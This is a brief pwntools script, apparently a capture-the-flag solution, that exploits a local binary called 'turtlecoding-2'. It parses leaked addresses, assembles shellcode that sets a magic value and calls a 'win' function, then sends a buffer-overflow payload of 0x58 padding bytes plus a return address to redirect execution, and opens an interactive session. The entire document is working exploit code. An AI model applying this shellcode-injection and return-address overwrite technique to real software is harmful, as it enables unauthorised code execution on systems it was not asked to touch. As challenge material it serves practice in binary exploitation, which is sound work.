from pwn import *

context.arch = "amd64"

p = process("./turtlecoding-2")

def get_num():
    p.recvuntil(b":")
    num = int(p.recvline(keepends=False).strip().decode(), 16)
    return num

win = get_num()
inp = get_num()
magic = win + 0x2ee7

shc = asm(f"mov rdi, 0x12345678\nmov rax, {magic}\nmov dword ptr [rax], 0x13371337\nmov rax, {win}\ncall rax")
assert b"\n" not in shc

p.sendlineafter(b"enter input: ", shc)
p.sendlineafter(b"enter more input: ", b"A" * 0x58 + p64(inp))

p.interactive()
